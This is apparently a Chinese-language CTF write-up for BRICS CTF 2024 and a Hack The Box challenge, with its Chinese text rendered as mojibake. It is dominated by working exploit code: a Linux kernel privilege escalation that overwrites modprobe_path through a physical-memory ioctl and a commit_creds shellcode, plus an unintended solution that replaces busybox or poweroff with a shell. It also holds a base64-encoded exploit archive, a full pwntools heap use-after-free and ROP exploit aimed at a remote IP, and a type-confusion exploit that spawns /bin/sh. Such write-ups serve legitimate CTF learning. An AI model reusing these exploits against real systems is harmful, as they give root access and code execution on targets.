# 2024-10-05-BRISC+CTF

â€

## hard-physler-kernel

### éé¢„æœŸåšæ³•

â€

* æƒé™æ²¡è®¾ç½®å¥½ï¼Œå…¨éƒ¨éƒ½æ—¶ rwx

â€‹![image](assets/image-20250101144545-x4qy01t.png)â€‹

æŠŠ /bin/busybox æ–‡ä»¶è¦†ç›–ï¼Œç„¶å exit

â€‹![image](assets/image-20250101145715-x79i8pe.png)â€‹

* exploit

```c
#include "minilib.h"

extern void _start(){
    char *files[] = {
        "/flag",
        "/flag.txt",
        "/root/flag",
        "/root/flag.txt",
        0};

    for(int i=0;files[i];i++){
        int fd = open(files[i],0);
        if(fd>0){
            sendfile(1, fd, 0, 0x100);
        }
    }
    syscall64(60,0);
}

//UEsDBBQAAAAIAOd2IVr0kO2YrAMAACglAAAHABwAZXhwbG9pdFVUCQAD0uZ0Z9LmdGd1eAsAAQQAAAAABAAAAADtWktrE1EUPol9pEVtFEXBIqMEqUin6cNWi49oO+0VWkUlC1EJSTNtCnmUZAZabXVRFK9B6Ur7C4obXzt10RaLNrqqG+mym0pAwYoFixTjvTN3kpkp8YUIwv3InXPPOd93zmQmWUxyrkpdHU6HAww44QhQ747bp/k+Fr+3O08hsQNQTo6VUKFxS8AMn8Wud4LFgls3VFdq8oH1M6zETsmwZp3WT2BxwWe1Bt+mK2Erw+IZh89i8+WYdYFVl2W6LOMb1sN4HhOf4uyiEv6TfqeJrgx+HcblK2F7ek07T/rJfYRpGltnym9hPs1PBBpntr8b2e86ef9u5hTedvzNVOtvtOXg4ODg4ODg4ODg4OD4z/C5audXP8KLCK8g/AXhtwi/7sbPu3GmK93lcVWVjl2cyXNGP7gRHlnB6nLav4zSEpG8nKIP9k9oqeyjXC73yswWKBthdQlhfxbh7gWUVsnqzqK0f4nqT+AlWqImXyJGSoxZanjRrdLbVQAIS3Nki/XtPNne0LcLhW0WzUpLtM6stErNe19aWkXjKN3+Ym6SBhCezYqkBZZWRkdW4Eo1fQ/jT+mPBc/0/Msp+sCebSGkUWnVUdCja9PqY63I1KH86U5+0073394yDg4ODg4ODg4ODg4ODo7fRioCtT1QF+qP15FtJXjrGxqb9je3HDh47Hhbu9QBFcJhAQTyIge6hkGEYajrjQb79KOoDCpQl0wkFBbMb7UMwxZmHZfOgGPQ7dixvtw1Rh61q0Ffgx9zOe0/dGmj+7qzbUPZeUJgOfq8PUzyojkvF/IXyLpJ8u3m/OVCfpisByT/0Jx3TmiEzra2VqHGH1LjiirUN4qNore2WdXchisNTaK3aS8L//g66nMJn3L2eDlZm53r4Ayba2hn8a0sbsxZPGRxt7ZKAbw+S51qxjfmI4x5gz1F+LVF4g2sjofVEY2EPDgg9kBKjod7+6MyBAKhVCqQUoJJBVJDqZ5gNNrcBAE5HFSCxMTDkBiQ40SfGoopwRCxSlK3EWMXTyiy2BdXxYEk4SaVIVMopPZHw7X9YRAVmXxIxGRCKyzKkUBvMhiTQexJxGJyXIG/hB2g3wtjDKUwj6H7go3vsvmiTV+YA9F9j41fYvOPgf4Zyc925OdddCM5rHybC50sZvQvzL3oJmjj2/WnbPoI00eYftzGt7//c0y/5muwSzf7ivQ3WyeshZfp5019nab+25mtgMIsi+U82VxSS5H+BjYV0R9l+tBP9N8BUEsBAh4DFAAAAAgA53YhWvSQ7ZisAwAAKCUAAAcAGAAAAAAAAAAAAO2BAAAAAGV4cGxvaXRVVAUAA9LmdGd1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBNAAAA7QMAAAAA
// echo -n ""|	base64 -d > exp.zip && unzip exp.zip
```

â€

â€

â€

```url
https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/BRICSCTF-2024/physler
```

```python
cd sbin
rm poweroff
cat << EOF > ./poweroff ; chmod +x ./poweroff
#!/bin/sh
/bin/sh
EOF
 
exit
```

â€

â€

### é¢„æœŸè§£æ³•

â€

é¢˜ç›®ç»™äº†æºä»£ç 

â€‹`physler.c`â€‹

```c
#include "physler.h"

static noinline long ioctlHandler(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct ioctl_map _map;
    struct ioctl_write _write;

    switch (cmd) {
        case IOCTL_MAP_PHYS_ADDR: {

            if (copy_from_user(&_map, (void*)arg, sizeof(_map))) {
                return -EFAULT;
            }

            if (mem)
                iounmap(mem);

            mem = ioremap(_map.phys_addr, _map.size);

            if (!mem) {
                return -EFAULT;
            }
            break;
        }
        case IOCTL_WRITE_PHYS_MEM: {
            if (!mem)
                return -EFAULT;

            if (copy_from_user(&_write, (void*)arg, sizeof(_write))) {
                return -EFAULT;
            }

            size = _write.size;

            if (size > sizeof(kernel_buffer))
                size = sizeof(kernel_buffer);

            if (copy_from_user(kernel_buffer, (char *)_write.in_data, size))
                return -EFAULT;

            memcpy_toio(mem, kernel_buffer, size);
            break;
        }
        default:
            return -EINVAL;
    }

    return 0;
}

static int __init init_dev(void){
    reg = misc_register(&physler_dev);
    if (reg < 0)
        printk("[-] Failed to register physler!");

    return 0;
};

static void __exit exit_dev(void){
    misc_deregister(&physler_dev);
}

module_init(init_dev);
module_exit(exit_dev);
```

â€‹`physler.h`â€‹

```c
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>
#include <linux/random.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/ioctl.h>
#include <linux/mm.h>
#include <linux/uaccess.h>
#include <linux/io.h>
#include <linux/cdev.h>
#include <linux/device.h>


#define IOCTL_MAP_PHYS_ADDR 0x1001
#define IOCTL_READ_PHYS_MEM 0x2002
#define IOCTL_WRITE_PHYS_MEM 0x3003

#define BUF_SIZE 4096

int reg;

static unsigned long phys_addr = 0;
static unsigned long size = 0;
static void __iomem *mem = NULL;
static char kernel_buffer[BUF_SIZE];

static struct ioctl_map {
    unsigned long phys_addr;
    unsigned long size;
};

static struct ioctl_write {
    unsigned long size;
    unsigned char* in_data;
};


static noinline long ioctlHandler(struct file *file, unsigned int cmd, unsigned long arg);
static int __init init_dev(void);
static void __exit exit_dev(void);

static struct file_operations physler_fops = {.unlocked_ioctl = ioctlHandler};

struct miscdevice physler_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "physler",
    .fops = &physler_fops,
};

MODULE_LICENSE("WTF");
MODULE_AUTHOR("kaker@keker");
MODULE_DESCRIPTION("Same shit different day");
```

â€

### å…³äºioremap

* ç¬¬ä¸€æ¬¡æ¥è§¦è¿™ä¸ªï¼Œå¯¹è¿™ä¸ªä¸æ˜¯å¤ªäº†è§£ï¼Œä¸‹é¢æ˜¯å¤§æ¨¡å‹ ç»™å‡ºçš„ ä¸€ä¸‹ä¿¡æ¯

**å·¥ä½œæœºåˆ¶**

1. â€‹**â€‹`ioremap`â€‹**â€‹ **çš„ä½œç”¨**:

    * å°†è®¾å¤‡çš„ç‰©ç†å†…å­˜åœ°å€ï¼ˆé€šå¸¸æ˜¯ I/O å¯„å­˜å™¨æˆ–å†…å­˜æ˜ å°„åŒºåŸŸï¼‰æ˜ å°„åˆ°å†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä¾›å†…æ ¸è®¿é—®ã€‚
    * è®¾å¤‡é©±åŠ¨ç¨‹åºéœ€è¦é€šè¿‡è¿™ç§æ–¹å¼è®¿é—®ç¡¬ä»¶èµ„æºï¼Œè€Œä¸æ˜¯ç›´æ¥æ“ä½œç‰©ç†åœ°å€ã€‚
2. â€‹**â€‹`iounmap`â€‹**â€‹ **çš„ä½œç”¨**:

    * é‡Šæ”¾ä¹‹å‰é€šè¿‡ `ioremap`â€‹ æ˜ å°„çš„å†…å­˜åŒºåŸŸã€‚
    * å†…æ ¸çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯æœ‰é™çš„ï¼Œå°¤å…¶åœ¨ 32 ä½ç³»ç»Ÿä¸Šï¼Œå› æ­¤é‡Šæ”¾ä¸éœ€è¦çš„æ˜ å°„æ˜¯ä¸€ä¸ªå…³é”®æ“ä½œã€‚

â€

â€‹`grok 2`â€‹

åœ¨è®¨è®º ioremap å’Œ "direct mapping of all physical memory (page_offset_base)" ä¹‹é—´çš„å…³ç³»ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç†è§£è¿™ä¸¤ä¸ªæ¦‚å¿µï¼š

* ioremapï¼šå¦‚å‰æ‰€è¿°ï¼Œæ˜¯ç”¨æ¥å°†è®¾å¤‡çš„ç‰©ç† I/O å†…å­˜æ˜ å°„åˆ°å†…æ ¸çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚è¿™ç§æ˜ å°„é€šå¸¸ä¸æ˜¯ç›´æ¥çš„ï¼Œè€Œæ˜¯é€šè¿‡å†…æ ¸çš„åœ°å€è½¬æ¢æœºåˆ¶ï¼ˆä½¿ç”¨é¡µè¡¨ç­‰ï¼‰æ¥å®ç°çš„ï¼Œç›®çš„æ˜¯ä¸ºäº†è®¿é—®ç¡¬ä»¶è®¾å¤‡çš„å†…å­˜ã€‚
* direct mapping of all physical memory (page_offset_base)ï¼šè¿™æ˜¯æŒ‡å†…æ ¸å°†ç‰©ç†å†…å­˜ç›´æ¥æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„ä¸€ç§ç­–ç•¥ã€‚åœ¨è¿™ç§æ˜ å°„ä¸­ï¼Œç‰©ç†åœ°å€å’Œè™šæ‹Ÿåœ°å€ä¹‹é—´çš„è½¬æ¢éå¸¸ç®€å•ï¼Œé€šå¸¸åªéœ€è¦åŠ ä¸Šä¸€ä¸ªå›ºå®šåç§»é‡ï¼ˆpage_offset_baseï¼‰ï¼Œè¿™åœ¨ Linux å†…æ ¸ä¸­è¢«ç§°ä¸ºçº¿æ€§æ˜ å°„æˆ–ç›´æ¥æ˜ å°„ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ x86 ä½“ç³»ç»“æ„ä¸Šï¼Œå†…æ ¸çš„è™šæ‹Ÿåœ°å€ç©ºé—´æœ‰ä¸€éƒ¨åˆ†æ˜¯ç”¨æ¥ç›´æ¥æ˜ å°„ç‰©ç†å†…å­˜çš„ï¼Œè¿™ä¸ªæ˜ å°„é€šå¸¸ä» PAGE_OFFSET å¼€å§‹ï¼Œä»»ä½•åœ¨è¿™ä¸€èŒƒå›´å†…çš„è™šæ‹Ÿåœ°å€éƒ½å¯¹åº”ä¸€ä¸ªç‰©ç†åœ°å€ï¼Œé€šè¿‡ç®€å•çš„åŠ å‡ PAGE_OFFSET å°±èƒ½å¾—åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€ã€‚

å…³ç³»ï¼š

è™½ç„¶ ioremap å’Œç›´æ¥æ˜ å°„çš„æ¦‚å¿µåœ¨ç›®çš„ä¸Šæ˜¯ç±»ä¼¼çš„ï¼ˆå°†ç‰©ç†åœ°å€è½¬ä¸ºå†…æ ¸å¯ç”¨çš„è™šæ‹Ÿåœ°å€ï¼‰ï¼Œä½†å®ƒä»¬åœ¨å®ç°å’Œç”¨é€”ä¸Šæœ‰æ‰€ä¸åŒï¼š

* ä¸åŒç‚¹ï¼š

  * æ˜ å°„ç±»å‹ï¼šioremap ç”¨äºå°†è®¾å¤‡çš„ I/O å†…å­˜æ˜ å°„åˆ°å†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚è¿™ç§æ˜ å°„å¯èƒ½ä¸ç›´æ¥å¯¹åº”åˆ°ç‰©ç†å†…å­˜çš„çº¿æ€§æ˜ å°„åŒºåŸŸï¼Œå®ƒå¯ä»¥æ˜¯éç¼“å­˜çš„æˆ–æœ‰ç‰¹å®šç¼“å­˜å±æ€§çš„ã€‚
  * ç”¨é€”ï¼šioremap ä¸»è¦ç”¨äºè®¾å¤‡é©±åŠ¨ç¨‹åºï¼Œå…è®¸å†…æ ¸è®¿é—®è®¾å¤‡çš„å†…å­˜ç©ºé—´ï¼Œè€Œç›´æ¥æ˜ å°„ï¼ˆå¦‚ page_offset_base æ‰€æŒ‡ï¼‰æ˜¯å†…æ ¸å¯¹å…¶è‡ªèº«å†…å­˜ä½¿ç”¨çš„ä¼˜åŒ–ï¼Œä½¿å¾—å†…æ ¸å¯ä»¥å¿«é€Ÿè®¿é—®å¤§éƒ¨åˆ†ç‰©ç†å†…å­˜ã€‚
  * èŒƒå›´å’ŒæŒä¹…æ€§ï¼šç›´æ¥æ˜ å°„é€šå¸¸æ˜¯å…¨å±€çš„ï¼Œæ¶µç›–äº†ç³»ç»Ÿçš„å¤§éƒ¨åˆ†ç‰©ç†å†…å­˜ï¼Œå¹¶ä¸”æ˜ å°„æ˜¯é™æ€çš„æˆ–åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è®¾ç½®å¥½çš„ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œioremap çš„æ˜ å°„æ˜¯åŠ¨æ€çš„ï¼Œæ ¹æ®éœ€è¦åˆ›å»ºå’Œé”€æ¯ã€‚
* ç›¸ä¼¼ç‚¹ï¼š

  * ç›®çš„ï¼šä¸¤è€…éƒ½ç”¨äºå°†ç‰©ç†åœ°å€è½¬æ¢ä¸ºå†…æ ¸å¯ä»¥è®¿é—®çš„è™šæ‹Ÿåœ°å€ã€‚
  * åœ°å€ç©ºé—´ä½¿ç”¨ï¼šå®ƒä»¬éƒ½ä½¿ç”¨å†…æ ¸çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä»¥æä¾›å¯¹ç¡¬ä»¶æˆ–å†…å­˜çš„è®¿é—®ã€‚

æ€»ç»“æ¥è¯´ï¼Œioremap å’Œç›´æ¥æ˜ å°„éƒ½æ˜¯ä¸ºäº†åŒä¸€ä¸ªç›®çš„â€”â€”è®©å†…æ ¸å¯ä»¥å®‰å…¨ã€æœ‰æ•ˆåœ°è®¿é—®ç‰©ç†åœ°å€ï¼Œä½†å®ƒä»¬åœ¨å…·ä½“å®ç°å’Œåº”ç”¨åœºæ™¯ä¸Šæ˜¯æœ‰å·®å¼‚çš„ã€‚ioremap æä¾›äº†ä¸€ç§æ›´çµæ´»ã€é€‚ç”¨äºç‰¹å®šè®¾å¤‡çš„è®¿é—®æ–¹å¼ï¼Œè€Œç›´æ¥æ˜ å°„åˆ™æ˜¯å¯¹å†…æ ¸å†…å­˜ç®¡ç†çš„ä¸€ç§ä¼˜åŒ–ç­–ç•¥ã€‚

â€

* é€šè¿‡ä¸Šé¢çš„ä¿¡æ¯æˆ‘å¤§æ¦‚å¯ä»¥ç†è§£äº†ï¼ˆä»¥ä¸‹ä»…æ˜¯æˆ‘ä¸ªäººè§‚ç‚¹ï¼‰

â€

```c
// phys_addr ä¼ å…¥ç‰©ç†åœ°å€ï¼ˆä¸æ˜¯è™šæ‹Ÿå†…å­˜ï¼‰ 
// size 4k å¯¹é½ 0x1000
size_t * mem = ioremap(_map.phys_addr, _map.size);
// ioremap ä¼šè¿”å›ç‰©ç†å†…å­˜æ˜ å°„å‡ºçš„è™šæ‹Ÿå†…å­˜ åœ°å€
```

â€‹![image](assets/image-20241226163814-x4lvtqy.png)â€‹

â€

* â€‹`pwndbg`â€‹ å¯ä»¥ä½¿ç”¨ `vprot`â€‹ æŸ¥çœ‹è™šæ‹Ÿå†…å­˜ï¼Œæ‰€å±•ç¤ºçš„å°±æ˜¯ è™šæ‹Ÿå†…å­˜

â€‹![image](assets/image-20241226163610-0bves41.png)â€‹

â€

å¯ä»¥ä¿®æ”¹ `modprobe_path`â€‹ç‰©ç†å†…å­˜ï¼ˆåŒæ—¶è™šæ‹Ÿå†…å­˜çš„å†…å®¹ä¹Ÿä¼šè¢«ä¿®æ”¹ï¼Œå› ä¸ºå®ƒåªæ˜¯ç‰©ç†å†…å­˜çš„æ˜ å°„ï¼‰

â€‹![image](assets/image-20241226164059-rg25k6l.png)â€‹

â€‹![image](assets/image-20241226163942-h74n6g2.png)â€‹

â€‹![image](assets/image-20241226163848-n0lrk9m.png)â€‹

* ç¡®å®š modprobe_path çš„ç‰©ç†åœ°å€

```python
0xffff888000000000 # ç‰©ç†å†…å­˜æ˜ å°„çš„èµ·å§‹åœ°å€
0xffff888002dd5820 #  +0x2dd5820 å°±æ˜¯ modprobe_path çš„æ˜ å°„åœ°å€ï¼Œ

# æ‰€ä»¥ modprobe_path çš„ç‰©ç†å†…å­˜ åœ°å€å°±æ˜¯ 0x2dd5820 
```

â€

* exploit

â€‹![image](assets/image-20241226171912-nb6jcrt.png)â€‹

æ‰§è¡Œcopyåï¼Œå†æ¬¡æŸ¥çœ‹

â€‹![image](assets/image-20241226171935-dxk7obw.png)â€‹

â€

```c
#include "minilib.h"
#define stbase(value) ((value) - 0xffffffff81000000ULL)


size_t nokaslr_kernel_base  = 0xffffffff81000000;
char *procn = "/dev/physler";
int fd = 0;


static void shellcode(){
    asm volatile (
        "xor rdi, rdi;"
        "mov rcx, prepare_kernel_cred;"
        "call rcx;"
        "mov rcx, commit_creds;"
        "call rcx;"
        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp
    );
    // restore_flags
    asm volatile (
        "push user_ss;"
        "push user_sp;"
        "push user_rflags;"
        "push user_cs;"
        "push shell_addr;"
        "swapgs;"
        "iretq;"
    );
}
static void end_shellcode(){ return; }
size_t sc_addr = &shellcode + 8;

struct ioctl_write {
  char * in_data;
  size_t size;
};

void add(struct ioctl_write buf){
    ioctl(fd,0x1001, &buf);
}
void edit(struct ioctl_write buf){
    ioctl(fd, 0x3003, &buf);
}
void doMain(){
    // size_t sc_size = &end_shellcode-&shellcode;
  
    save_status();

    fd = open(procn,2);
    lss("fd",fd);

    struct ioctl_write buf;

    buf.in_data = 0x2dd5820;
    buf.size = 0x1000;

    add(buf);
    char path[] = "/tmp/e1";
    buf.in_data = 8;
    buf.size = &path;
    edit(buf);
    modprobe_rce();

}
extern void _start(){
    size_t env[0];
    environ = &env[4];
    doMain();
    syscall64(60,0);
}





```

â€

## medium-chains

### æ¼æ´è§¦å‘ç‚¹

```python
add_proxy('1',0x123) # æ·»åŠ ä¸€ä¸ª ä»£ç†
```

â€‹![image](assets/image-20250101151956-861ay3a.png)â€‹

â€‹![image](assets/image-20250101152039-yum1yhx.png)â€‹

â€

```python
add_chain(1,[0]) # æ·»åŠ ä¸€ä¸ªä»£ç†é“¾
```

â€‹![image](assets/image-20250101152107-zkifn2x.png)â€‹

â€

```python
delete_chain(0) # åˆ æ‰è¿™ä¸ªä»£ç†é“¾,
# chains[0] æŒ‡é’ˆæ¸…ç©º, proxies[0]ä¹Ÿè¢«free,ä½†æ˜¯ä¹ˆæ²¡æœ‰æŠŠ proxies[0] æ¸…ç©º
# è¿™å°±æ„æˆé‡Œä¸€ä¸ªUAF
```

â€‹![image](assets/image-20250101152154-od6qn0n.png)â€‹

â€

```python
delete_proxy(0)
```

â€‹![image](assets/image-20250101152240-93n6thx.png)â€‹

â€‹![image](assets/image-20250101152332-ht2sjqu.png)â€‹

â€

â€

â€

* exploit è€ƒéªŒä¸€ç‚¹å †é£æ°´, æˆ‘çå‡ æŠŠå†™çš„æ¯”è¾ƒä¹±

```python
from pwn import *
import sys

# Define lambda functions for common operations
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
ls      = lambda data               :log.success(data)
lss     = lambda s                  :ls('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
itr     = lambda                    :io.interactive()
# Context settings
context.arch      = 'amd64'
context.log_level = 'debug' # info
context.terminal  = ['tmux','splitw','-h','-l','170']
def start(binary,argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if   args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.CMD: return process(binary.split(' '))
    elif args.REM: return remote('89.169.156.185', 13995)
    elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))
    '''     Usage: python3 exp.py AWD <IP> <PORT>   '''
    return process([binary] + argv, *a, **kw)

binary = './chains'

elf  = ELF(binary);rop = ROP(binary)
libc = elf.libc
gdbscript = '''
#continue
#brva 0x01AD1
brva 0x1314
'''.format(**locals())


import socks
context.proxy = (socks.SOCKS5, '192.168.100.24', 10808)

io = start(binary)

def add(addr, port):
    ru('> ')
    sl('1')
    ru(': ')
    sl(addr)
    ru('Enter proxy port: ')
    sl(str(port))
def rm(idx):
    ru('> ')
    sl('2')
    ru(': ')
    sl(str(idx))
def chain(size,idl):
    ru('> ')
    sl('3')
    ru('chain size: ')
    sl(str(size))
    for i in range(size):
        ru('proxy id: ')
        sl(str(idl[i]))
def show(idx):
    ru('> ')
    sl('4')
    ru(': ')
    sl(str(idx))

def rm_chain(idx):
    ru('> ')
    sl('5')
    ru(': ')
    sl(str(idx))



add('1',0x123)
chain(1,[0])
rm_chain(0)
add('2',0x124)
chain(1,[0])
show(0)
ru(' proxy #0 is ')
heap_base = uu64(r(6)) - 0x2a0
lss('heap_base')
#show(0)
#rm(0)
#rm(0)
#show(0)

pay = b'A' * 0x10 + p64(0) + p64(0x451)
add('33',0x22) # 2
add(pay,0x23) # 3
add('55',0x24) # 4

chain(1,[2]) # 1
chain(1,[2]) # 2
chain(1,[2]) # 3

rm_chain(1)

chain(1,[3]) # 4
chain(1,[3]) # 5



rm(2)

add(p64(heap_base+0x460),0) # 5
add('pad1',0x1) # 6
add('pad2',0x1) # 7
add('pad3',0x1) # 8
add('pad4',0x1) # 9
add(p64(0x0)+p64(0x81),0x1) # 7

rm_chain(4)
add('pad4',0x1) # 10
add('pad5',0x1) # 11

rm(11)
pay  = 0x48 * b'\x00'
pay += p64(0x21) + p64(heap_base + 0x530)
add(pay,0x1) # 11
#chain(1,[4]) # 6
#chain(1,[4]) # 6
##chain(1,[4]) # 6
chain(1,[4])

show(4)
ru('is ')
libc_base = uu64(r(6)) - 2112288

lss('libc_base')

libc.address = libc_base

env = libc.sym['environ']

rm(11)
pay  = 0x48 * b'\x00'
pay += p64(0x21) + p64(env)
add(pay,0x1) # 11

show(4)
ru('is ')
stack = uu64(r(6)) - 8

lss('stack')


rm(11)
pay  = 0x48 * b'\x00'
pay += p64(0x21) + p64(heap_base + 0x440)
add(pay,0x1) # 11


rm(6)
rm(11)
rm(4)
#rm_chain(4)
key = heap_base >> 0xC
pay  = b'\x00' * 0x18
pay += p64(0x21) + p64((heap_base+0x20) ^ key) * 3
pay += p64(0x91) + p64((stack-400) ^ key)

add(pay,0x1) # 6
add('pad',0x1) # 6
#gdb.attach(io,gdbscript)
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))
poprdi = next(libc.search(asm('pop rdi;ret')))
ret = poprdi + 1
pay = p64(ret) * 2 + p64(poprdi) + p64(bin_sh) + p64(system)
ru('> ')
sl('1')
ru(': ')
sl(pay)

lss('heap_base')
lss('libc_base')
lss('stack')




itr()

```

â€

â€‹![image](assets/image-20241005205127-9a32m8o.png)â€‹

â€

## gollum

 go è¯­è¨€å†™çš„ï¼Œç»™äº†æºç +

â€‹`tree`â€‹

```bash
.
â”œâ”€â”€ build.sh
â”œâ”€â”€ cmd
â”‚Â Â  â””â”€â”€ main.go
â”œâ”€â”€ database
â”‚Â Â  â””â”€â”€ database.go
â”œâ”€â”€ Dockerfile
â”œâ”€â”€ go.mod
â”œâ”€â”€ models
â”‚Â Â  â”œâ”€â”€ credential.go
â”‚Â Â  â””â”€â”€ user.go
â”œâ”€â”€ services
â”‚Â Â  â””â”€â”€ auth.go
â””â”€â”€ util
    â””â”€â”€ hashes.go
```

â€

* å…ˆç®€å•çš„å†™ä¸€ä¸‹äº¤äº’èœå•

```
```

â€

â€

### **Type Confusion æ¼æ´**

ä»¥ä¸‹ä»£ç å±•ç¤ºäº†ä¸€ä¸ªç±»å‹æ··æ·†çš„ç®€å•åœºæ™¯ï¼š

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// å®šä¹‰ä¸¤ä¸ªä¸åŒçš„ç»“æ„ä½“
typedef struct {
    int id;
    char name[20];
} User;

typedef struct {
    int price;
    char description[20];
} Product;

void type_confusion_demo(void* data, int is_user) {
    if (is_user) {
        // å‡è®¾ data æ˜¯ä¸€ä¸ª User ç±»å‹
        User* user = (User*)data;
        printf("User ID: %d\n", user->id);
        printf("User Name: %s\n", user->name);
    } else {
        // å‡è®¾ data æ˜¯ä¸€ä¸ª Product ç±»å‹
        Product* product = (Product*)data;
        printf("Product Price: %d\n", product->price);
        printf("Product Description: %s\n", product->description);
    }
}

int main() {
    // åˆ›å»ºä¸€ä¸ª User å¯¹è±¡
    User* user = (User*)malloc(sizeof(User));
    user->id = 42;
    strcpy(user->name, "Alice");

    // å°† User å¯¹è±¡é”™è¯¯åœ°å½“ä½œ Product ç±»å‹å¤„ç†
    printf("Interpreting User as Product:\n");
    type_confusion_demo(user, 0);

    free(user);
    return 0;
}
```

---

**è¿è¡Œç»“æœ**

è¿è¡Œä¸Šè¿°ä»£ç åï¼Œè¾“å‡ºå¯èƒ½æ˜¯ç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼š

```mathematica
Interpreting User as Product:
Product Price: 42
Product Description: Alice
```

**ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ**

1. **å†…å­˜å¸ƒå±€é—®é¢˜**ï¼š

    * åœ¨ `User`â€‹ å’Œ `Product`â€‹ çš„å®šä¹‰ä¸­ï¼Œ`id`â€‹ å’Œ `price`â€‹ éƒ½æ˜¯ `int`â€‹ ç±»å‹ï¼Œå æ®ç›¸åŒçš„å†…å­˜ä½ç½®ã€‚
    * åŒæ ·ï¼Œ`name`â€‹ å’Œ `description`â€‹ çš„å†…å­˜åŒºåŸŸä¹Ÿé‡å ã€‚
2. **é”™è¯¯çš„ç±»å‹è§£é‡Š**ï¼š

    * å®é™…ä¸Šä¼ é€’çš„ `data`â€‹ æ˜¯ä¸€ä¸ª `User`â€‹ ç±»å‹çš„æŒ‡é’ˆï¼Œä½†åœ¨å‡½æ•°ä¸­å°†å…¶å½“ä½œ `Product`â€‹ ç±»å‹æ¥è§£é‡Šï¼Œå¯¼è‡´å†…å­˜è¢«é”™è¯¯åœ°è§£æã€‚
3. **æ½œåœ¨çš„å±å®³**ï¼š

    * å¦‚æœæ•°æ®ç»“æ„çš„å¤§å°æˆ–å¸ƒå±€ä¸åŒ¹é…ï¼Œå¯èƒ½ä¼šè®¿é—®åˆ°æ— æ•ˆçš„å†…å­˜åŒºåŸŸï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒæˆ–æœªå®šä¹‰è¡Œä¸ºã€‚
    * åœ¨æ›´å¤æ‚çš„ç¨‹åºä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´ä¼ªé€ æ•°æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚

â€

â€

â€

* å®˜æ–¹wp

```python
#!/usr/bin/env python3

import sys

import pwn


def register(io: pwn.tube, username: bytes, password: bytes, protection: bytes) -> None:
    io.sendlineafter(b'> ', b'REGISTER')

    io.sendlineafter(b': ', username)
    io.sendlineafter(b': ', password)
    io.sendlineafter(b': ', protection)

    return


def login(io: pwn.tube, username: bytes, password: bytes) -> None:
    io.sendlineafter(b'> ', b'LOGIN')

    io.sendlineafter(b': ', username)
    io.sendlineafter(b': ', password)

    return


def info(io: pwn.tube) -> bytes:
    io.sendlineafter(b'> ', b'INFO')

    return io.recvline()[4:]


def update(io: pwn.tube, description: bytes) -> None:
    io.sendlineafter(b'> ', b'UPDATE')

    io.sendlineafter(b': ', description)

    return


def logout(io: pwn.tube) -> None:
    io.sendlineafter(b'> ', b'LOGOUT')

    return


def exit(io: pwn.tube) -> None:
    io.sendlineafter(b'> ', b'EXIT')

    return


def main() -> None:
    IP = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 17172

    io = pwn.remote(IP, PORT)

    # 0000000000402680 T syscall.RawSyscall6

    for i in range(28):
        register(io, f'x_{i}'.encode(), b'x', b'full')
        logout(io)

    register(io, b'x', b'x', b'full')
    update(io, pwn.p64(0x0000000000402680) + pwn.p64(0))
    logout(io)
    login(io, b'x', b'x')
    logout(io)

    # pwn.pause()

    payload = b'/bin/sh\x00'
    payload += b'A' * (0x400008 - len(payload))

    register(io, payload, b'y', b'full')

    io.interactive()


if __name__ == '__main__':
    main()
```

â€

â€

## HTB-vortex-user

â€

å¯ä»¥è®¾ç½® env å’ŒæŸ¥çœ‹env, è®¾ç½® env æ—¶ä¼šè®°å½•æ—¥å¿—ï¼Œç„¶åæŸ¥çœ‹æ—¥å¿—å­˜åœ¨ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´

â€

å¾ˆå¹¸è¿è¿œç¨‹çš„ubuntu libc å’Œæˆ‘æœ¬åœ°çš„æ˜¯ä¸€æ ·çš„ï¼Œ æˆ‘æ˜¯é€šè¿‡ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ get shell 

```python
from pwn import *
import sys

# Define lambda functions for common operations
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
